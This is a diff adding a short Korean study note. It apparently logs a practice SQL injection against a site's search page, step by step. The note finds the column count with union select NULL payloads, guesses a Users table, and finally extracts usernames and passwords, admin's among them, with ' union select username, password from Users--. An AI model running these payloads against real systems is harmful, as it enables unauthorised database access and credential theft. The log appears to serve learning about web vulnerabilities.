@@ -1,0 +1,15 @@
+1. search 페이지에 가서 admin을 검색해 봤더니 아무 겨로가도 나오지 않았다.
+2. ' 1=1--입력했더니 home 페이지에 있는 5개의 게시물이 다 나왔다. 이스케이프처리는 안돼있는 것 같다.
+3. ' union select NULL--를 넣었더니 칼럼수가 맞지 않다는 에러가 떴다.
+4. ' union select NULL, NULL--을 넣었더니 게시물 5개를 포함해 아무 내용도 없는 게시물 하나가 더 나왔다. 컴럼 수는 2개 인것 같다.
+5. ' union select NULL,NULL from memeber--를 했더니 테이블이 없다는 오류가 떴다.
+6. ' union select NULL, NULL from Users--를 넣었더니 결과물이 마찬가지로 6개 나왔다.
+7. ' union select username, password from Users--를 넣었더니 admin을 포함한 3명의 유저네임과 pw가 나왔다.
+
+===
+1. 이스케이프 확인
+2. 칼럼수 확인
+3. 테이블 존재 확인
+4. 칼럼 존재 확인
+
+
